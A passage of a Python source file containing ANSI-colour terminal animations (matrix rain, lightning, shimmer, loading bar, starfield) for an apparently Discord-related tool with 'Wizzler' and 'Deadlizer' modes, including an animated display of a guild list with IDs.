                        line_out += f"\033[1m\033[38;2;{r2};{g2};{b2}m{char}"
                        continue
                d = drops[c_idx]
                dist = r_idx - d['y']
                if 0 <= dist <= d['trail']:
                    intensity = (1.0 - dist / d['trail']) * fade_out
                    if dist == 0:
                        r2, g2, b2 = min(255, int(180*intensity)), min(255, int(255*intensity)), min(255, int(255*intensity))
                    else:
                        trail_t = dist / d['trail']
                        r2 = int((WIZZLER_START[0]*(1-trail_t) + WIZZLER_END[0]*trail_t) * intensity * 0.6)
                        g2 = int((WIZZLER_START[1]*(1-trail_t) + WIZZLER_END[1]*trail_t) * intensity * 0.6)
                        b2 = int((WIZZLER_START[2]*(1-trail_t) + WIZZLER_END[2]*trail_t) * intensity * 0.6)
                    line_out += f"\033[38;2;{r2};{g2};{b2}m{random.choice(MATRIX_CHARS)}"
                else:
                    line_out += " "
            sys.stdout.write(line_out + "\033[0m\n")
        for d in drops:
            d['y'] += d['speed']
            if d['y'] - d['trail'] > rows:
                d['y'] = random.uniform(-8, -1)
                d['speed'] = random.uniform(0.4, 1.5)
                d['trail'] = random.randint(4, 14)
        sys.stdout.flush()
        time.sleep(0.014)

    # ══════════════════════════════════════════════════════════════════════════
    # PHASE 7 — WIZZLER BREATHING GLOW SETTLE  (28 frames)
    # ══════════════════════════════════════════════════════════════════════════
    for frame in range(28):
        if skipper.should_skip: break
        sys.stdout.write("\033[H")
        breathe = math.sin(frame / 27 * math.pi * 3.0) * 0.20
        bg_pulse = 0.03 + 0.03 * math.sin(frame * 0.4)
        for r_idx in range(rows):
            line_idx = r_idx - banner_start
            if 0 <= line_idx < len(w_banner):
                line = w_banner[line_idx]
                out = ""
                for c_idx, ch in enumerate(line):
                    h_blend = c_idx / max(len(line)-1, 1)
                    r2 = int(WIZZLER_START[0]*(1-h_blend) + WIZZLER_END[0]*h_blend)
                    g2 = int(WIZZLER_START[1]*(1-h_blend) + WIZZLER_END[1]*h_blend)
                    b2 = int(WIZZLER_START[2]*(1-h_blend) + WIZZLER_END[2]*h_blend)
                    glow = 1.0 + breathe
                    if ch != " " and random.random() < 0.018:
                        out += f"\033[38;2;255;255;255m{random.choice(SPARK_CHARS)}"
                    else:
                        out += f"\033[38;2;{min(255,int(r2*glow))};{min(255,int(g2*glow))};{min(255,int(b2*glow))}m{ch}"
                sys.stdout.write("\033[1m" + out + "\033[0m\n")
            else:
                line_out = ""
                for c_idx in range(cols):
                    if random.random() < bg_pulse:
                        r2, g2, b2 = dark_cyber(bg_pulse * 3, phase=c_idx * 0.04 + frame * 0.1)
                        line_out += f"\033[38;2;{r2};{g2};{b2}m{random.choice('░▒')}"
                    else:
                        line_out += " "
                sys.stdout.write(line_out + "\033[0m\n")
        sys.stdout.flush()
        time.sleep(0.035)

    skipper.stop()
    os.system("cls") if os.name == "nt" else os.system("clear")



def _menu_fade_out(color_start, color_end):
    import sys
    try:
        cols = os.get_terminal_size().columns
        rows = os.get_terminal_size().lines
    except Exception:
        cols = 120
        rows = 30

    skipper = _AnimationSkipper(required_presses=2)
    skipper.start()

    is_deadlizer = (color_start == DEADLIZER_START)
    fade_chars = "||| " if is_deadlizer else "|||| "
    steps = 6
    for step in range(steps):
        if skipper.should_skip:
            break
        t = step / max(steps - 1, 1)
        fade = 1.0 - t
        sys.stdout.write("\033[H")
        for row in range(rows):
            line = ""
            for c in range(cols):
                if random.random() < fade * 0.4:
                    h_blend = c / max(cols - 1, 1)
                    r = int(color_start[0] * (1 - h_blend) + color_end[0] * h_blend)
                    g = int(color_start[1] * (1 - h_blend) + color_end[1] * h_blend)
                    b = int(color_start[2] * (1 - h_blend) + color_end[2] * h_blend)
                    r = min(255, int(r * fade))
                    g = min(255, int(g * fade))
                    b = min(255, int(b * fade))
                    line += f"\033[38;2;{r};{g};{b}m{random.choice(fade_chars)}"
                else:
                    line += " "
            sys.stdout.write(line + "\033[0m\n")
        sys.stdout.flush()
        time.sleep(0.03)
    skipper.stop()
    os.system("cls") if os.name == "nt" else os.system("clear")


def _animate_menu_options(options_text, color_start, color_end):
    import sys, math
    # Use the same fixed width as the rest of the menu for consistent centering
    try:
        term_cols = os.get_terminal_size().columns
    except Exception:
        term_cols = 140
    cols = max(term_cols, 140)

    skipper = _AnimationSkipper(required_presses=2)
    skipper.start()

    # Strip leading/trailing blank lines so cursor-up counts are exact
    raw_lines = options_text.split('\n')
    # remove leading empty lines
    while raw_lines and not raw_lines[0].strip():
        raw_lines.pop(0)
    # remove trailing empty lines
    while raw_lines and not raw_lines[-1].strip():
        raw_lines.pop()
    lines = raw_lines

    sparkle_chars = "+*.:o^"
    glitch_chars = "||||+||++++--|-+|||_"

    def render_line(line, color_start, color_end, cols, sparkle=False, step=0, row_idx=0, visible_chars=None, glitch_frontier=False):
        pad = max((cols - len(line)) // 2, 0)
        output = ""
        for col_idx, ch in enumerate(line):
            h_blend = col_idx / max(len(line) - 1, 1)
            r = int(color_start[0] * (1 - h_blend) + color_end[0] * h_blend)
            g = int(color_start[1] * (1 - h_blend) + color_end[1] * h_blend)
            b = int(color_start[2] * (1 - h_blend) + color_end[2] * h_blend)
            if visible_chars is not None:
                if col_idx < visible_chars:
                    if sparkle:
                        wave = math.sin(col_idx * 0.2 - step * 0.8 + row_idx * 0.3) * 0.5 + 0.5
                        if wave > 0.85 and ch.strip() and random.random() < 0.3:
                            output += f"\033[38;2;{min(255,r+80)};{min(255,g+80)};{min(255,b+80)}m{random.choice(sparkle_chars)}"
                            continue
                    output += f"\033[38;2;{r};{g};{b}m{ch}"
                elif col_idx == visible_chars and ch.strip() and glitch_frontier:
                    output += f"\033[38;2;255;255;255m{random.choice(glitch_chars)}"
                else:
                    output += " "
            else:
                output += f"\033[38;2;{r};{g};{b}m{ch}"
        return " " * pad + "\033[1m" + output + "\033[0m"

    n = len(lines)

    # Print placeholder lines first so cursor-up works correctly
    for _ in lines:
        sys.stdout.write("\n")

    # Phase 1: staggered slide-in
    slide_steps = 12
    for step in range(slide_steps + 1):
        if skipper.should_skip:
            break
        t = step / slide_steps
        sys.stdout.write(f"\033[{n}A")
        for row_idx, line in enumerate(lines):
            row_delay = row_idx * 0.35
            row_t = max(0.0, min(1.0, (t * (slide_steps + row_delay)) / (slide_steps + n * 0.35)))
            row_ease = 1 - (1 - row_t) ** 3
            visible_chars = int(row_ease * len(line))
            sys.stdout.write(render_line(line, color_start, color_end, cols,
                sparkle=True, step=step, row_idx=row_idx,
                visible_chars=visible_chars, glitch_frontier=True) + "\n")
        sys.stdout.flush()
        time.sleep(0.022)

    # Phase 2: shimmer sweep left-to-right
    shimmer_steps = 18
    for step in range(shimmer_steps):
        if skipper.should_skip:
            break
        wave_pos = (step / max(shimmer_steps - 1, 1)) * (cols + 40) - 20
        sys.stdout.write(f"\033[{n}A")
        for row_idx, line in enumerate(lines):
            pad = max((cols - len(line)) // 2, 0)
            output = ""
            for col_idx, ch in enumerate(line):
                h_blend = col_idx / max(len(line) - 1, 1)
                r = int(color_start[0] * (1 - h_blend) + color_end[0] * h_blend)
                g = int(color_start[1] * (1 - h_blend) + color_end[1] * h_blend)
                b = int(color_start[2] * (1 - h_blend) + color_end[2] * h_blend)
                dist = abs(col_idx - (wave_pos - pad))
                if dist < 8 and ch.strip():
                    shimmer = max(0.0, 1.0 - dist / 8.0)
                    r = min(255, int(r + (255 - r) * shimmer * 0.7))
                    g = min(255, int(g + (255 - g) * shimmer * 0.7))
                    b = min(255, int(b + (255 - b) * shimmer * 0.7))
                output += f"\033[38;2;{r};{g};{b}m{ch}"
            sys.stdout.write(" " * pad + "\033[1m" + output + "\033[0m\n")
        sys.stdout.flush()
        time.sleep(0.025)

    # Phase 3: breathing glow settle | final clean render
    for step in range(8):
        if skipper.should_skip:
            break
        breathe = math.sin(step / 7 * math.pi) * 0.15
        sys.stdout.write(f"\033[{n}A")
        for row_idx, line in enumerate(lines):
            pad = max((cols - len(line)) // 2, 0)
            output = ""
            for col_idx, ch in enumerate(line):
                h_blend = col_idx / max(len(line) - 1, 1)
                r = int(color_start[0] * (1 - h_blend) + color_end[0] * h_blend)
                g = int(color_start[1] * (1 - h_blend) + color_end[1] * h_blend)
                b = int(color_start[2] * (1 - h_blend) + color_end[2] * h_blend)
                glow = 1.0 + breathe
                output += f"\033[38;2;{min(255,int(r*glow))};{min(255,int(g*glow))};{min(255,int(b*glow))}m{ch}"
            sys.stdout.write(" " * pad + "\033[1m" + output + "\033[0m\n")
        sys.stdout.flush()
        time.sleep(0.04)

    if skipper.should_skip:
        # Final clean render if skipped
        sys.stdout.write(f"\033[{n}A")
        for row_idx, line in enumerate(lines):
            pad = max((cols - len(line)) // 2, 0)
            output = ""
            for col_idx, ch in enumerate(line):
                h_blend = col_idx / max(len(line) - 1, 1)
                r = int(color_start[0] * (1 - h_blend) + color_end[0] * h_blend)
                g = int(color_start[1] * (1 - h_blend) + color_end[1] * h_blend)
                b = int(color_start[2] * (1 - h_blend) + color_end[2] * h_blend)
                output += f"\033[38;2;{r};{g};{b}m{ch}"
            sys.stdout.write(" " * pad + "\033[1m" + output + "\033[0m\n")
        sys.stdout.flush()

    skipper.stop()


def _animate_typewriter_log(status, message, padding=50):
    import sys, time, random
    full_msg = format_log_message(status, message, padding)
    segments = []
    current_esc = ""
    i = 0
    while i < len(full_msg):
        if full_msg[i] == '\033':
            end = full_msg.find('m', i)
            if end != -1:
                current_esc += full_msg[i:end + 1]
                i = end + 1
            else:
                current_esc += full_msg[i]
                i += 1
        else:
            segments.append((current_esc, full_msg[i]))
            current_esc = ""
            i += 1
    
    skipper = _AnimationSkipper(required_presses=2)
    skipper.start()

    for k in range(1, len(segments) + 1):
        if skipper.should_skip:
            break
        sys.stdout.write("\r")
        out = "".join(e + c for e, c in segments[:k])
        cursor = "█" if k % 2 == 0 else " "
        sys.stdout.write(out + f"\033[38;2;255;255;255m{cursor}\033[0m")
        sys.stdout.flush()
        time.sleep(random.uniform(0.01, 0.025))
    
    skipper.stop()
    sys.stdout.write("\r" + full_msg + "   \n")
    sys.stdout.flush()


def _animate_guild_list(guilds, color_start, color_end):
    import sys, time, random, math
    skipper = _AnimationSkipper(required_presses=2)
    skipper.start()

    os.system("cls") if os.name == "nt" else os.system("clear")
    
    try:
        term_cols, term_rows = os.get_terminal_size()
    except Exception:
        term_cols, term_rows = 120, 30

    header_text = "Available Guilds:"
    padding_val = 140
    box_top = "╭" + "─" * padding_val + "╮"
    box_bot = "╰" + "─" * padding_val + "╯"
    
    guild_lines = []
    for i, guild in enumerate(guilds):
        name = str(guild.get('name', 'Unknown'))
        gid = str(guild.get('id', 'N/A'))
        line = f"│ {i+1:>3} │ {name:<104} │ ID: {gid:<20}  │"
        guild_lines.append(line)

    all_lines = [box_top] + guild_lines + [box_bot]
    n = len(all_lines)
    
    sparkle_chars = "+*.:o^"
    glitch_chars = "||||+||++++--|-+|||_"

    def render_line(line, row_idx, step, visible_chars=None, sparkle=True):
        pad = max((term_cols - len(line)) // 2, 0)
        output = ""
        v_ratio = row_idx / max(n - 1, 1)
        for col_idx, ch in enumerate(line):
            h_ratio = col_idx / max(len(line)-1, 1)
            mix = (h_ratio * 0.4 + v_ratio * 0.6)
            r = int(color_start[0] * (1 - mix) + color_end[0] * mix)
            g = int(color_start[1] * (1 - mix) + color_end[1] * mix)
            b = int(color_start[2] * (1 - mix) + color_end[2] * mix)
            
            if visible_chars is not None:
                if col_idx < visible_chars:
                    if sparkle and ch.strip() and random.random() < 0.04:
                        wave = math.sin(col_idx * 0.15 - step * 0.7 + row_idx * 0.45) * 0.5 + 0.5
                        if wave > 0.88:
                            output += f"\033[38;2;{min(255,r+120)};{min(255,g+120)};{min(255,b+120)}m{random.choice(sparkle_chars)}"
                            continue
                    output += f"\033[38;2;{r};{g};{b}m{ch}"
                elif col_idx == visible_chars and ch.strip():
                    output += f"\033[38;2;255;255;255m{random.choice(glitch_chars)}"
                else:
                    output += " "
            else:
                 output += f"\033[38;2;{r};{g};{b}m{ch}"
        return " " * pad + "\033[1m" + output + "\033[0m"

    print(format_log_message("INFO", header_text, 50))
    
    # Phase 1: Staggered reveal
    total_frames = 25
    for frame in range(total_frames):
        if skipper.should_skip:
            break
        if frame > 0:
            sys.stdout.write(f"\033[{n}A")
        
        t = frame / (total_frames - 1)
        for row_idx, line in enumerate(all_lines):
            row_delay = row_idx * 0.4
            row_t = max(0.0, min(1.0, (t * (10 + row_delay)) / 10))
            visible = int(row_t * len(line))
            sys.stdout.write(render_line(line, row_idx, frame, visible_chars=visible) + "\n")
        sys.stdout.flush()
        time.sleep(0.025)

    # Phase 2: Shimmering settle
    settle_frames = 8
    for frame in range(settle_frames):
        if skipper.should_skip:
            break
        sys.stdout.write(f"\033[{n}A")
        t = frame / (settle_frames - 1)
        breathe = math.sin(t * math.pi) * 0.1
        for row_idx, line in enumerate(all_lines):
            pad = max((term_cols - len(line)) // 2, 0)
            output = ""
            v_ratio = row_idx / max(n - 1, 1)
            for col_idx, ch in enumerate(line):
                h_ratio = col_idx / max(len(line)-1, 1)
                mix = (h_ratio * 0.4 + v_ratio * 0.6)
                r = int(color_start[0] * (1 - mix) + color_end[0] * mix)
                g = int(color_start[1] * (1 - mix) + color_end[1] * mix)
                b = int(color_start[2] * (1 - mix) + color_end[2] * mix)
                glow = 1.0 + breathe
                output += f"\033[38;2;{min(255,int(r*glow))};{min(255,int(g*glow))};{min(255,int(b*glow))}m{ch}"
            sys.stdout.write(" " * pad + "\033[1m" + output + "\033[0m\n")
        sys.stdout.flush()
        time.sleep(0.04)

    # Final static render
    if not skipper.should_skip:
        sys.stdout.write(f"\033[{n}A")
    else:
        os.system("cls") if os.name == "nt" else os.system("clear")
        print(format_log_message("INFO", header_text, 50))

    for row_idx, line in enumerate(all_lines):
        pad = max((term_cols - len(line)) // 2, 0)
        v_ratio = row_idx / max(n - 1, 1)
        out = ""
        for col_idx, ch in enumerate(line):
            h_ratio = col_idx / max(len(line)-1, 1)
            mix = (h_ratio * 0.4 + v_ratio * 0.6)
            r = int(color_start[0] * (1 - mix) + color_end[0] * mix)
            g = int(color_start[1] * (1 - mix) + color_end[1] * mix)
            b = int(color_start[2] * (1 - mix) + color_end[2] * mix)
            out += f"\033[38;2;{r};{g};{b}m{ch}"
        sys.stdout.write(" " * pad + "\033[1m" + out + "\033[0m\n")
    sys.stdout.flush()
    
    skipper.stop()



def _menu_load_animation(banner_lines, color_start, color_end, mode_label):
    """Sexy menu loading animation matching the mode-switch style. Double-Enter skips."""
    import sys, math
    os.system("cls") if os.name == "nt" else os.system("clear")
    skipper = _AnimationSkipper(required_presses=2)
    skipper.start()
    try:
        cols = os.get_terminal_size().columns
        term_rows = os.get_terminal_size().lines
    except Exception:
        cols = 120
        term_rows = 30

    total_lines = len(banner_lines)
    max_width = max(len(line) for line in banner_lines) if banner_lines else 40
    glitch_chars = "||||+||++++--|-+|||_"
    rain_chars = "???????????????????????????????????0123456789"
    sparkle_chars = "+*.:o^"
    is_deadlizer = (color_start == DEADLIZER_START)

    def hsv_to_rgb(h, s, v):
        h = h % 360
        c = v * s
        x = c * (1 - abs((h / 60) % 2 - 1))
        m = v - c
        if h < 60: r, g, b = c, x, 0
        elif h < 120: r, g, b = x, c, 0
        elif h < 180: r, g, b = 0, c, x
        elif h < 240: r, g, b = 0, x, c
        elif h < 300: r, g, b = x, 0, c
        else: r, g, b = c, 0, x
        return int((r + m) * 255), int((g + m) * 255), int((b + m) * 255)

    rain_rows = min(term_rows - 2, total_lines + 4)
    num_columns = min(cols, max_width + 20)
    col_offset = max((cols - num_columns) // 2, 0)

    if is_deadlizer:
        # --- DEADLIZER PHASE 0: Electric Blood Lightning ---
        lightning_chars = "++++|-||--+|||||+--+"
        bolt_chars = "+X#*|/\\"
        bolts = [{'x': random.randint(0, num_columns - 1), 'y': 0, 'speed': random.uniform(1.5, 3.0), 'width': random.randint(1, 3)} for _ in range(8)]
        lightning_frames = 22
        for frame in range(lightning_frames):
            if skipper.should_skip:
                break
            sys.stdout.write("\033[H")
            fade = max(0.0, 1.0 - frame / (lightning_frames - 1)) if frame > lightning_frames * 0.6 else 1.0
            grid = [[' '] * num_columns for _ in range(rain_rows)]
            color_grid = [[(0, 0, 0)] * num_columns for _ in range(rain_rows)]
            for bolt in bolts:
                bolt['y'] += bolt['speed']
                if bolt['y'] > rain_rows:
                    bolt['x'] = random.randint(0, num_columns - 1)
                    bolt['y'] = 0
                    bolt['speed'] = random.uniform(1.5, 3.0)
                cur_x = bolt['x']
                for seg_y in range(int(bolt['y'])):
                    if seg_y >= rain_rows:
                        break
                    cur_x = max(0, min(num_columns - 1, cur_x + random.randint(-bolt['width'], bolt['width'])))
                    dist_from_head = int(bolt['y']) - seg_y
                    intensity = max(0.0, 1.0 - dist_from_head / 12.0) * fade
                    if dist_from_head == 0:
                        r2, g2, b2 = min(255, int(255 * intensity)), min(255, int(180 * intensity)), min(255, int(200 * intensity))
                        ch2 = random.choice(bolt_chars)
                    else:
                        r2 = min(255, int(color_start[0] * intensity))
                        g2 = min(255, int(color_start[1] * intensity * 0.4))
                        b2 = min(255, int(color_end[0] * intensity * 0.6))
                        ch2 = random.choice(lightning_chars)
                    grid[seg_y][cur_x] = ch2
                    color_grid[seg_y][cur_x] = (r2, g2, b2)
            for row in range(rain_rows):
                line_out = " " * col_offset
                for c in range(num_columns):
                    ch2 = grid[row][c]
                    r2, g2, b2 = color_grid[row][c]
                    if ch2 != ' ':
                        line_out += f"\033[38;2;{r2};{g2};{b2}m{ch2}"
                    else:
                        if random.random() < 0.008:
                            fr = min(255, int(color_start[0] * 0.3 * fade))
                            fg = min(255, int(color_start[1] * 0.1 * fade))
                            fb = min(255, int(color_end[0] * 0.2 * fade))
                            line_out += f"\033[38;2;{fr};{fg};{fb}m{random.choice('|||')}"
                        else:
                            line_out += " "
                sys.stdout.write(line_out + "\033[0m\n")
            sys.stdout.flush()
            time.sleep(0.045)
    else:
        # --- WIZZLER PHASE 0: Matrix Digital Rain ---
        drops = [{'y': random.randint(-rain_rows, 0), 'speed': random.uniform(0.5, 1.4), 'trail': random.randint(3, 10)} for _ in range(num_columns)]
        rain_frames = 18
        for frame in range(rain_frames):
            if skipper.should_skip:
                break
            sys.stdout.write("\033[H")
            fade_out = max(0.0, 1.0 - frame / (rain_frames - 1)) if frame > rain_frames * 0.55 else 1.0
            for row in range(rain_rows):
                line_out = " " * col_offset
                for c in range(num_columns):
                    d = drops[c]
                    dist = row - d['y']
                    if 0 <= dist <= d['trail']:
                        intensity = (1.0 - (dist / d['trail'])) * fade_out
                        if dist == 0:
                            r = min(255, int((color_start[0] * 0.7 + 180) * intensity))
                            g = min(255, int((color_start[1] * 0.7 + 180) * intensity))
                            b = min(255, int((color_start[2] * 0.7 + 180) * intensity))
                        else:
                            trail_t = dist / d['trail']
                            r = int((color_start[0] * (1 - trail_t) + color_end[0] * trail_t) * intensity)
                            g = int((color_start[1] * (1 - trail_t) + color_end[1] * trail_t) * intensity)
                            b = int((color_start[2] * (1 - trail_t) + color_end[2] * trail_t) * intensity)
                        line_out += f"\033[38;2;{r};{g};{b}m{random.choice(rain_chars)}"
                    else:
                        line_out += " "
                sys.stdout.write(line_out + "\033[0m\n")
            for d in drops:
                d['y'] += d['speed']
                if d['y'] - d['trail'] > rain_rows:
                    d['y'] = random.randint(-6, -1)
                    d['speed'] = random.uniform(0.5, 1.4)
                    d['trail'] = random.randint(3, 10)
            sys.stdout.flush()
            time.sleep(0.04)

    os.system("cls") if os.name == "nt" else os.system("clear")

    # --- PHASE 1: Plasma Radial Glitch Reveal ---
    phase1_frames = 30
    lock_frame = []
    for row_idx, line in enumerate(banner_lines):
        row_locks = []
        for col_idx in range(len(line)):
            cx, cy = max_width / 2, total_lines / 2
            dist = math.sqrt((col_idx - cx) ** 2 + ((row_idx - cy) * 3) ** 2)
            max_dist = math.sqrt(cx ** 2 + (cy * 3) ** 2)
            progress = dist / max(max_dist, 1)
            lock_at = int(4 + progress * (phase1_frames - 10)) + random.randint(-3, 3)
            lock_at = max(3, min(phase1_frames - 3, lock_at))
            row_locks.append(lock_at)
        lock_frame.append(row_locks)

    for frame in range(phase1_frames):
        if skipper.should_skip:
            break
        if frame > 0:
            sys.stdout.write(f"\033[{total_lines}A")
        t = frame / max(phase1_frames - 1, 1)
        wave_x = t * (max_width + 50) - 25
        ring_radius = t * max(max_width, total_lines * 3) * 0.9
        hue_base = 240 if color_start == WIZZLER_START else 320

        for row_idx, line in enumerate(banner_lines):
            pad = max((cols - len(line)) // 2, 0)
            output = ""
            for col_idx, real_char in enumerate(line):
                locked = frame >= lock_frame[row_idx][col_idx]
                if real_char == ' ':
                    ch = random.choice(glitch_chars) if frame < phase1_frames // 4 and random.random() < 0.04 else ' '
                elif not locked:
                    reveal_chance = (frame / lock_frame[row_idx][col_idx]) ** 2
                    ch = real_char if random.random() < reveal_chance * 0.5 else random.choice(glitch_chars)
                else:
                    ch = real_char
                hue = hue_base + ((col_idx * 2 + row_idx * 6 + frame * 10) % 120)
                val = min(1.0, t * 1.8)
                cx, cy = max_width / 2, total_lines / 2
                dist_ring = abs(math.sqrt((col_idx - cx) ** 2 + ((row_idx - cy) * 3) ** 2) - ring_radius)
                ring_glow = max(0.0, 1.0 - dist_ring / 15.0)
                dist_wave = abs(col_idx - wave_x)
                wave_glow = max(0.0, 1.0 - dist_wave / 20.0)
                combined_glow = min(1.0, ring_glow * 0.6 + wave_glow * 0.5)
                r, g, b = hsv_to_rgb(hue, 0.85, val)
                if combined_glow > 0:
                    r = min(255, int(r + (255 - r) * combined_glow * 0.8))
                    g = min(255, int(g + (255 - g) * combined_glow * 0.9))
                    b = min(255, int(b + (255 - b) * combined_glow * 0.85))
                if locked and real_char != ' ' and random.random() < 0.01:
                    r, g, b = 255, 255, 255
                output += f"\033[38;2;{r};{g};{b}m{ch}"
            sys.stdout.write(" " * pad + "\033[1m" + output + "\033[0m\n")
        sys.stdout.flush()
        time.sleep(0.045)

    # --- PHASE 2: Rainbow Shimmer ? Mode Colors ---
    shimmer_frames = 20
    for frame in range(shimmer_frames):
        if skipper.should_skip:
            break
        sys.stdout.write(f"\033[{total_lines}A")
        t = frame / max(shimmer_frames - 1, 1)
        settle = t * t
        for row_idx, line in enumerate(banner_lines):
            pad = max((cols - len(line)) // 2, 0)
            output = ""
            for col_idx, ch in enumerate(line):
                hue = (col_idx * 3.5 + row_idx * 14 - frame * 16) % 360
                r_rainbow, g_rainbow, b_rainbow = hsv_to_rgb(hue, 0.9, 1.0)
                h_blend = col_idx / max(len(line) - 1, 1)
                r_final = int(color_start[0] * (1 - h_blend) + color_end[0] * h_blend)
                g_final = int(color_start[1] * (1 - h_blend) + color_end[1] * h_blend)
                b_final = int(color_start[2] * (1 - h_blend) + color_end[2] * h_blend)
                r = int(r_rainbow * (1 - settle) + r_final * settle)
                g = int(g_rainbow * (1 - settle) + g_final * settle)
                b = int(b_rainbow * (1 - settle) + b_final * settle)
                sparkle_wave = math.sin((col_idx * 0.15 - frame * 0.9 + row_idx * 0.4)) * 0.5 + 0.5
                if sparkle_wave > 0.91 and ch != ' ' and random.random() < 0.45:
                    spark_ch = random.choice(sparkle_chars)
                    output += f"\033[38;2;{min(255,r+130)};{min(255,g+130)};{min(255,b+130)}m{spark_ch}"
                else:
                    output += f"\033[38;2;{r};{g};{b}m{ch}"
            sys.stdout.write(" " * pad + "\033[1m" + output + "\033[0m\n")
        sys.stdout.flush()
        time.sleep(0.04)

    # --- PHASE 3: Neon Pulse Flash ---
    for pulse in range(5):
        if skipper.should_skip:
            break
        sys.stdout.write(f"\033[{total_lines}A")
        pulse_val = (math.sin(pulse * math.pi * 0.8) + 1) / 2
        brightness = 0.5 + pulse_val * 0.5
        for row_idx, line in enumerate(banner_lines):
            pad = max((cols - len(line)) // 2, 0)
            r = min(255, int(color_start[0] * brightness + 100 * pulse_val))
            g = min(255, int(color_start[1] * brightness + 50 * pulse_val))
            b = min(255, int(color_start[2] * brightness + 80 * pulse_val))
            sys.stdout.write(" " * pad + f"\033[1m\033[38;2;{r};{g};{b}m" + line + "\033[0m\n")
        sys.stdout.flush()
        time.sleep(0.07)

    # --- PHASE 4: Breathing Glow Settle ---
    breathe_frames = 12
    for frame in range(breathe_frames):
        if skipper.should_skip:
            break
        sys.stdout.write(f"\033[{total_lines}A")
        t = frame / max(breathe_frames - 1, 1)
        breathe = math.sin(t * math.pi * 3) * (1 - t) * 0.25
        for row_idx, line in enumerate(banner_lines):
            pad = max((cols - len(line)) // 2, 0)
            output = ""
            for col_idx, ch in enumerate(line):
                h_blend = col_idx / max(len(line) - 1, 1)
                r = int(color_start[0] * (1 - h_blend) + color_end[0] * h_blend)
                g = int(color_start[1] * (1 - h_blend) + color_end[1] * h_blend)
                b = int(color_start[2] * (1 - h_blend) + color_end[2] * h_blend)
                glow = 1.0 + breathe
                output += f"\033[38;2;{min(255,int(r*glow))};{min(255,int(g*glow))};{min(255,int(b*glow))}m{ch}"
            sys.stdout.write(" " * pad + "\033[1m" + output + "\033[0m\n")
        sys.stdout.flush()
        time.sleep(0.05)

    # --- PHASE 5: Loading Bar ---
    print()
    bar_width = 40
    label = f"  LOADING {mode_label.upper()} MENU  "
    pad = max((cols - bar_width - len(label) - 4) // 2, 0)
    load_steps = bar_width
    for i in range(load_steps + 1):
        if skipper.should_skip:
            break
        filled = "|" * i
        empty = "|" * (bar_width - i)
        pct = int((i / load_steps) * 100)
        h_blend = i / max(load_steps, 1)
        r = int(color_start[0] * (1 - h_blend) + color_end[0] * h_blend)
        g = int(color_start[1] * (1 - h_blend) + color_end[1] * h_blend)
        b = int(color_start[2] * (1 - h_blend) + color_end[2] * h_blend)
        bar_str = f"\033[38;2;{r};{g};{b}m\033[1m[{filled}{empty}] {pct:3d}%\033[0m"
        sys.stdout.write(f"\r{' ' * pad}{label}{bar_str}")
        sys.stdout.flush()
        time.sleep(0.018)
    sys.stdout.write("\n")

    # --- PHASE 6: Typewriter "MENU READY" line ---
    ready_msg = format_log_message("SUCCESS", f"{mode_label} Menu Ready", 40)
    if not skipper.should_skip:
        segments = []
        current_esc = ""
        i = 0
        while i < len(ready_msg):
            if ready_msg[i] == '\033':
                end = ready_msg.find('m', i)
                if end != -1:
                    current_esc += ready_msg[i:end + 1]
                    i = end + 1
                else:
                    current_esc += ready_msg[i]
                    i += 1
            else:
                segments.append((current_esc, ready_msg[i]))
                current_esc = ""
                i += 1
        for k in range(1, len(segments) + 1):
            sys.stdout.write("\r\033[K")
            out = "".join(e + c for e, c in segments[:k])
            cursor = "|" if k % 2 == 0 else "|"
            sys.stdout.write(out + f"\033[38;2;255;255;255m{cursor}\033[0m")
            sys.stdout.flush()
            time.sleep(0.02)
        sys.stdout.write("\r\033[K" + ready_msg + "\n")
        sys.stdout.flush()
        time.sleep(0.5)
    else:
        print(ready_msg)

    skipper.stop()
    os.system("cls") if os.name == "nt" else os.system("clear")


def _wizzler_switch_hyperdrive():
    """HYPERDRIVE: Starfield accelerating into a neon Wizzler burst."""
    import sys, math, random, time
    os.system("cls") if os.name == "nt" else os.system("clear")
    skipper = _AnimationSkipper(required_presses=2)
    skipper.start()
    try:
        cols, rows = os.get_terminal_size()
    except Exception:
        cols, rows = 120, 30

    cx, cy = cols / 2, rows / 2
    stars = []
    for _ in range(150):
        angle = random.uniform(0, math.pi * 2)
        dist = random.uniform(2, 20)
        stars.append({'angle': angle, 'dist': dist, 'speed': random.uniform(0.1, 0.5), 'char': random.choice(".*+✦")})

    frames = 45
    for frame in range(frames):
        if skipper.should_skip: break
        sys.stdout.write("\033[H")
        grid = [[" "] * cols for _ in range(rows)]
        cgrid = [[(0, 0, 0)] * cols for _ in range(rows)]
        
        t = frame / frames
        speed_mult = 1.0 + t * 15.0

        for star in stars:
            star['dist'] += star['speed'] * speed_mult
            x = int(cx + math.cos(star['angle']) * star['dist'] * 2.0)
            y = int(cy + math.sin(star['angle']) * star['dist'])
            if 0 <= x < cols and 0 <= y < rows:
                if frame > frames * 0.7:
                    # Neon transitioning
                    r = int(WIZZLER_START[0]*(1-t) + WIZZLER_END[0]*t)
                    g = int(WIZZLER_START[1]*(1-t) + WIZZLER_END[1]*t)
                    b = int(WIZZLER_START[2]*(1-t) + WIZZLER_END[2]*t)
                    grid[y][x] = random.choice("■█▓▒")
                    cgrid[y][x] = (r, g, b)
                else:
                    intensity = min(1.0, star['dist'] / 20.0)
                    val = int(255 * intensity)
                    grid[y][x] = star['char']
                    cgrid[y][x] = (val, val, 255)
            elif star['dist'] > max(cols, rows):
                star['dist'] = random.uniform(1, 5)
                star['angle'] = random.uniform(0, math.pi * 2)

        for r_idx in range(rows):
            out = ""
            for c_idx in range(cols):
                ch = grid[r_idx][c_idx]
                cr, cg, cb = cgrid[r_idx][c_idx]
                out += f"\033[38;2;{cr};{cg};{cb}m{ch}" if ch != " " else " "
            sys.stdout.write(out + "\033[0m\n")
        sys.stdout.flush()
        time.sleep(0.02)
    skipper.stop()
    os.system("cls") if os.name == "nt" else os.system("clear")

def _wizzler_switch_neural():
    """NEURAL GRID: Cybernetic synapses connecting into the Wizzler matrix."""
    import sys, math, random, time
    os.system("cls") if os.name == "nt" else os.system("clear")
    skipper = _AnimationSkipper(required_presses=2)
    skipper.start()
    try:
        cols, rows = os.get_terminal_size()
    except Exception:
        cols, rows = 120, 30

    nodes = [{'x': random.randint(0, cols-1), 'y': random.randint(0, rows-1), 'active': False} for _ in range(60)]
    active_nodes = [nodes[0]]
    nodes[0]['active'] = True

    frames = 40
    for frame in range(frames):
        if skipper.should_skip: break
        sys.stdout.write("\033[H")
        grid = [[" "] * cols for _ in range(rows)]
        cgrid = [[(0,0,0)] * cols for _ in range(rows)]
        
        t = frame / frames

        # Activate new nodes
